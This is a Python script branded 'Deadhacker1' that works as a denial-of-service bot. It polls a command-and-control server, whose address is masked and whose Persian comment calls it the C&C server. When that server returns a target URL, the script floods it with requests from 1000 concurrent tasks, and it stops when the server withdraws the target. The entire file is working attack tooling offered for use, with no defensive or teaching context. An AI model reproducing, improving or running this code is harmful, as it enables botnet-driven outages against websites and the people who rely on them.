import asyncio
import aiohttp
import sys
import os
import time
from pystyle import Colors, Colorate, Add


osystem = sys.platform

if osystem == "linux":
    os.system("clear")
else:
    os.system("cls")

print("""
{+}  Deadhacker1
""")
time.sleep(2.5)

if osystem == "linux":
    os.system("clear")
else:
    os.system("cls")

time.sleep(1)
ascii = r'''
     
[!] ==============================


{+} Telegram : @DeadHacker_Rip'''

banner = r"""
v2 """.replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)
print(Colorate.Horizontal(Colors.red_to_blue, banner))


CONNECTION_LIMIT = 1000
COMMAND_SERVER = "https://****.com/command"  # سرور فرماندهی و کنترل (C&C)


url = None

async def fetch(session, url, task_id):
    global reqs
    while url:
        start = int(time.time())
        try:
            async with session.get(url) as response:  
                set_end = int(time.time())
                set_final = start - set_end
                final = str(set_final).replace("-", "")

                if response.status == 200:
                    reqs += 1
                sys.stdout.write(f"Requests: {str(reqs)} | Time: {final} | Response Status Code: {str(response.status)}\r")
                await asyncio.sleep(0.01)
        except Exception as e:
            sys.stdout.write(f"Error: {str(e)}\r")
            await asyncio.sleep(0.01)
    print(f"\n[!] Task {task_id} stopped.")

async def get_command(session):
    global url, tasks

    while True:
        try:
            async with session.get(COMMAND_SERVER) as response:
                if response.status == 200:
                    command = await response.text()
                    command = command.strip()  

                    if command.startswith("http"):
                        if url != command:
                          
                            for task in tasks:
                                task.cancel()

                            url = command
                            print(f"\n[!] New Target URL received: {url}")

                           
                            tasks = [
                                asyncio.create_task(fetch(session, url, i))
                                for i in range(CONNECTION_LIMIT)
                            ]
                    else:
                       
                        if url:
                            print("\n[!] Target URL removed, stopping attack.")
                            for task in tasks:
                                task.cancel()
                        url = None

                await asyncio.sleep(10)  
        except Exception as e:
            sys.stdout.write(f"Error fetching command: {str(e)}\r")
            await asyncio.sleep(10)

async def main():
    global url, tasks
    tasks = []
    connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT)
    async with aiohttp.ClientSession(connector=connector) as session:
        await get_command(session)

if __name__ == '__main__':
    reqs = 0
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Process interrupted.")
